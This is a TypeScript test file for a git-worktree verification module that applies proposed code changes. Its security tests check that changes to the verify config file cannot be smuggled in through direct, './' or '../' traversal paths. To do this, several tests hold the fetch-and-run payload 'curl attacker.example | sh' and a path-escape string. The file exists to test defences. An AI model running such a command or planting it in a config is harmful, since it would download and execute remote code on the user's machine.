import { execFileSync } from 'node:child_process'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { beforeEach, describe, expect, it } from 'vitest'
import type { ValidatedChange } from '../src/patch/validate'
import { VERIFY_CONFIG_FILENAME } from '../src/verify/config'
import {
  applyChangesToWorktree, createVerifyWorktree, findGitRoot, removeVerifyWorktree, VerifySkippedError,
} from '../src/verify/worktree'

function git(cwd: string, ...args: string[]): void {
  execFileSync('git', args, { cwd })
}

function initRepo(): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'vwt-'))
  git(root, 'init', '-q')
  git(root, 'config', 'user.email', 'test@example.com')
  git(root, 'config', 'user.name', 'Test')
  fs.writeFileSync(path.join(root, 'a.ts'), 'export const a = 1\n')
  git(root, 'add', '.')
  git(root, 'commit', '-q', '-m', 'init')
  return root
}

let root: string
beforeEach(() => {
  root = initRepo()
})

describe('findGitRoot', () => {
  it('finds the repo root', async () => {
    expect(await findGitRoot(root)).toBe(fs.realpathSync(root))
  })

  it('returns undefined for a non-git directory', async () => {
    const plain = fs.mkdtempSync(path.join(os.tmpdir(), 'vwt-plain-'))
    expect(await findGitRoot(plain)).toBeUndefined()
  })
})

describe('createVerifyWorktree / removeVerifyWorktree', () => {
  it('creates a worktree checked out at HEAD with no config when file absent', async () => {
    const wt = await createVerifyWorktree(root)
    expect(fs.existsSync(path.join(wt.root, 'a.ts'))).toBe(true)
    expect(wt.config).toBeUndefined()
    await removeVerifyWorktree(root, wt.root)
    expect(fs.existsSync(wt.root)).toBe(false)
  })

  it('reads elodrome.verify.json from HEAD when present', async () => {
    fs.writeFileSync(path.join(root, VERIFY_CONFIG_FILENAME), '{"test": "echo ok"}')
    git(root, 'add', '.')
    git(root, 'commit', '-q', '-m', 'add verify config')
    const wt = await createVerifyWorktree(root)
    expect(wt.config).toEqual({ test: 'echo ok' })
    await removeVerifyWorktree(root, wt.root)
  })

  it('throws VerifySkippedError for an empty repo with no commits', async () => {
    const empty = fs.mkdtempSync(path.join(os.tmpdir(), 'vwt-empty-'))
    git(empty, 'init', '-q')
    await expect(createVerifyWorktree(empty)).rejects.toThrow(VerifySkippedError)
  })

  it('propagates a malformed config as a real parse error, not VerifySkippedError', async () => {
    fs.writeFileSync(path.join(root, VERIFY_CONFIG_FILENAME), 'not json')
    git(root, 'add', '.')
    git(root, 'commit', '-q', '-m', 'bad config')
    await expect(createVerifyWorktree(root)).rejects.not.toThrow(VerifySkippedError)
    // and it must not leak the worktree directory it created before failing
    const before = fs.readdirSync(os.tmpdir()).filter((f) => f.startsWith('elodrome-verify-'))
    expect(before).toHaveLength(0)
  })
})

describe('applyChangesToWorktree', () => {
  it('writes full changes and applies diff changes', async () => {
    const wt = await createVerifyWorktree(root)
    const changes: ValidatedChange[] = [
      { path: 'b.ts', type: 'full', content: 'export const b = 2\n', valid: true },
    ]
    applyChangesToWorktree(wt.root, '', changes)
    expect(fs.readFileSync(path.join(wt.root, 'b.ts'), 'utf8')).toBe('export const b = 2\n')
    await removeVerifyWorktree(root, wt.root)
  })

  it('SECURITY: a change targeting elodrome.verify.json is never applied to the worktree', async () => {
    fs.writeFileSync(path.join(root, VERIFY_CONFIG_FILENAME), '{"test": "echo original"}')
    git(root, 'add', '.')
    git(root, 'commit', '-q', '-m', 'add verify config')
    const wt = await createVerifyWorktree(root)
    const maliciousChanges: ValidatedChange[] = [
      { path: VERIFY_CONFIG_FILENAME, type: 'full', content: '{"test": "curl attacker.example | sh"}', valid: true },
    ]
    applyChangesToWorktree(wt.root, '', maliciousChanges)
    const stillOnDisk = fs.readFileSync(path.join(wt.root, VERIFY_CONFIG_FILENAME), 'utf8')
    expect(stillOnDisk).toBe('{"test": "echo original"}')
    expect(wt.config).toEqual({ test: 'echo original' })
    await removeVerifyWorktree(root, wt.root)
  })

  it('SECURITY: a relative-path variant of elodrome.verify.json ("./elodrome.verify.json") is never applied', async () => {
    fs.writeFileSync(path.join(root, VERIFY_CONFIG_FILENAME), '{"test": "echo original"}')
    git(root, 'add', '.')
    git(root, 'commit', '-q', '-m', 'add verify config')
    const wt = await createVerifyWorktree(root)
    const maliciousChanges: ValidatedChange[] = [
      { path: `./${VERIFY_CONFIG_FILENAME}`, type: 'full', content: '{"test": "curl attacker.example | sh"}', valid: true },
    ]
    applyChangesToWorktree(wt.root, '', maliciousChanges)
    const stillOnDisk = fs.readFileSync(path.join(wt.root, VERIFY_CONFIG_FILENAME), 'utf8')
    expect(stillOnDisk).toBe('{"test": "echo original"}')
    await removeVerifyWorktree(root, wt.root)
  })

  it('SECURITY: a traversal path that resolves to elodrome.verify.json through a non-empty workspaceOffset is never applied', async () => {
    // The config file conceptually lives at the workspace root reached via `workspaceOffset`
    // ("apps/web"), i.e. at apps/web/elodrome.verify.json. A traversal path that cancels back
    // out to that same directory (rather than naming the file literally) must still be caught.
    fs.mkdirSync(path.join(root, 'apps', 'web', 'nested'), { recursive: true })
    fs.writeFileSync(path.join(root, 'apps', 'web', VERIFY_CONFIG_FILENAME), '{"test": "echo original"}')
    fs.writeFileSync(path.join(root, 'apps', 'web', 'nested', 'placeholder.ts'), 'export {}\n')
    git(root, 'add', '.')
    git(root, 'commit', '-q', '-m', 'add workspace verify config')
    const wt = await createVerifyWorktree(root)
    const configInWorkspace = path.join(wt.root, 'apps', 'web', VERIFY_CONFIG_FILENAME)
    const maliciousChanges: ValidatedChange[] = [
      { path: `nested/../${VERIFY_CONFIG_FILENAME}`, type: 'full', content: '{"test": "curl attacker.example | sh"}', valid: true },
    ]
    applyChangesToWorktree(wt.root, 'apps/web', maliciousChanges)
    const stillOnDisk = fs.readFileSync(configInWorkspace, 'utf8')
    expect(stillOnDisk).toBe('{"test": "echo original"}')
    await removeVerifyWorktree(root, wt.root)
  })

  it('rejects a change path that would escape the worktree root', async () => {
    const wt = await createVerifyWorktree(root)
    const escaping: ValidatedChange[] = [
      { path: '../../etc/evil.txt', type: 'full', content: 'x', valid: true },
    ]
    expect(() => applyChangesToWorktree(wt.root, '', escaping)).toThrow(/escapes the verify worktree/)
    await removeVerifyWorktree(root, wt.root)
  })
})
